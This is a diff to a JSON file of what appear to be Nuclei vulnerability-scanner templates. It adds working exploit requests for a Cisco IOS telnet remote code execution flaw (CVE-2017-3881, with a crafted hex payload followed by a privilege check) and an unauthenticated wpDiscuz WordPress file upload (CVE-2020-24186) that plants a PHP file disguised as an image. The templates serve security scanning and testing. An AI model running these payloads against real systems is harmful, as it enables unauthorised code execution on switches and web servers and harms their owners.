@@ -1007,6 +1007,43 @@
       ]
     },
     {
+      "id": "CVE-2017-3881",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "RCE exploit code is available for Cisco Catalyst 2960 switch model. This exploit is firmware dependent.",
+        "name": "Cisco IOS 12.2(55)SE11 Remote Code Execution",
+        "reference": "- https://github.com/artkond/cisco-rce\n- https://artkond.com/2017/04/10/cisco-catalyst-remote-code-execution/\n- https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/dos/cisco/ios_telnet_rocem.md\n",
+        "severity": "critical",
+        "tags": "cve,cve2017,cisco,rce,network"
+      },
+      "network": [
+        {
+          "host": [
+            "{{Hostname}}:23"
+          ],
+          "inputs": [
+            {
+              "data": "{{hex_decode('fffa240003')}}CISCO_KITS{{hex_decode('01')}}2:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA{{hex_decode('000037b4023d55dc0000999c')}}BBBB{{hex_decode('00e1a9f4')}}CCCCDDDDEEEE{{hex_decode('00067b5c023d55c8')}}FFFFGGGG{{hex_decode('006cb3a000270b94')}}HHHHIIII{{hex_decode('014acf98')}}JJJJKKKKLLLL{{hex_decode('0114e7ec')}}:15:{{hex_decode('fff0')}}",
+              "read": 1024
+            },
+            {
+              "data": "show priv",
+              "read": 1024
+            }
+          ],
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "Current privilege level is"
+              ]
+            }
+          ],
+          "read-size": 1024
+        }
+      ]
+    },
+    {
       "id": "CVE-2017-5638",
       "info": {
         "author": "Random Robbie",
@@ -6396,6 +6433,65 @@
           },
           "raw": [
             "POST /index.php?option=§component§&controller=editlieux&tmpl=component&task=upload_image HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarySHHbUsfCoxlX1bpS\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: {{BaseURL}}\nConnection: close\n\n------WebKitFormBoundarySHHbUsfCoxlX1bpS\nContent-Disposition: form-data; name=\"option\"\n\ncom_gmapfp\n------WebKitFormBoundarySHHbUsfCoxlX1bpS\nContent-Disposition: form-data; name=\"image1\"; filename=\"nuclei.html.gif\"\nContent-Type: text/html\n\nprojectdiscovery\n\n------WebKitFormBoundarySHHbUsfCoxlX1bpS\nContent-Disposition: form-data; name=\"no_html\"\n\nno_html\n------WebKitFormBoundarySHHbUsfCoxlX1bpS--\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-24186",
+      "info": {
+        "author": "Ganofins",
+        "description": "WordPress wpDiscuz plugin version 7.0.4. This flaw gave unauthenticated attackers the ability to upload arbitrary files, including PHP files, and achieve remote code execution on a vulnerable site’s server.",
+        "name": "Unauthenticated File upload wpDiscuz WordPress plugin RCE",
+        "reference": "https://github.com/suncsr/wpDiscuz_unauthenticated_arbitrary_file_upload/blob/main/README.md",
+        "severity": "critical",
+        "tags": "cve,cve2020,wordpress,wp-plugin,rce"
+      },
+      "requests": [
+        {
+          "extractors": [
+            {
+              "group": 1,
+              "internal": true,
+              "name": "wmuSecurity",
+              "part": "body",
+              "regex": [
+                "wmuSecurity\":\"([a-z0-9]+)"
+              ],
+              "type": "regex"
+            },
+            {
+              "group": 1,
+              "part": "body",
+              "regex": [
+                "\"url\":\"([a-z:\\\\/0-9-.]+)\""
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "success\":true",
+                "fullname",
+                "shortname",
+                "url"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "GET /?p=1 HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nConnection: close\n",
+            "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nContent-Length: 745\nAccept: */*\nX-Requested-With: XMLHttpRequest\nsec-ch-ua-mobile: ?0\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary88AhjLimsDMHU1Ak\nOrigin: {{BaseURL}}\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: {{BaseURL}}\nAccept-Encoding: gzip, deflate\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\nConnection: close\n\n------WebKitFormBoundary88AhjLimsDMHU1Ak\nContent-Disposition: form-data; name=\"action\"\n\nwmuUploadFiles\n------WebKitFormBoundary88AhjLimsDMHU1Ak\nContent-Disposition: form-data; name=\"wmu_nonce\"\n\n{{wmuSecurity}}\n------WebKitFormBoundary88AhjLimsDMHU1Ak\nContent-Disposition: form-data; name=\"wmuAttachmentsData\"\n\nundefined\n------WebKitFormBoundary88AhjLimsDMHU1Ak\nContent-Disposition: form-data; name=\"wmu_files[0]\"; filename=\"rce.php\"\nContent-Type: image/png\n\n{{base64_decode('/9j/4WpFeGlmTU0q/f39af39Pv39/f39/f39/f2o/f39/cD9/f39/f39/f39/f/g/UpGSUb9/f39/9tD/f0M/QwK/f0=')}}\n<?php phpinfo();?>\n------WebKitFormBoundary88AhjLimsDMHU1Ak\nContent-Disposition: form-data; name=\"postId\"\n\n1\n------WebKitFormBoundary88AhjLimsDMHU1Ak--\n"
           ]
         }
       ]
